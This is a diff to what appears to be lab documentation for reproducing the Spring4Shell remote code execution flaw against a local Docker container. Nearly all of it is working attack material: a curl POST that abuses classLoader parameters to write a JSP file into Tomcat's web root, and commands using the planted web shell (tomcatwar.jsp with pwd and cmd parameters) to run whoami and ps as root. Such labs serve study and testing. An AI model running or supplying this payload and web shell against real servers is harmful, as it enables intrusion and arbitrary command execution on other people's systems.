@@ -39,8 +39,10 @@ $ ./exploit.py --url http://localhost:8080/rce/greeting
 ```
 
 ```bash
+$ docker exec -it spring4shell cat /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp
+
 $ ./exploit.py --url http://localhost:8080/tomcatwar.jsp
-Vulnerable，shell ip:http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami
+Vulnerable, shell ip:http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami
 
 $ curl "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami" --output -
 root
@@ -49,4 +51,25 @@ $ curl "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=ps" --output -
   PID TTY          TIME CMD
     1 ?        00:00:19 java
    99 ?        00:00:00 ps
+```
+
+- [Spring4Shell: The zero-day RCE in the Spring Framework explained
+](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/) - Snyk
+
+```bash
+$ curl -X POST \
+    -H "pre:<%" \
+    -H "post:;%>" \
+    -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println("HACKED" + (2 + 5))%{post}i' \
+    -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
+    -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
+    -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar' \
+    -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
+    http://localhost:8080/rce/greeting
+
+$ curl "http://localhost:8080/tomcatwar.jsp"
+HACKED7
+
+$ docker exec -it spring4shell cat /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp
+<% out.println("HACKED" + (2 + 5));%>
 ```
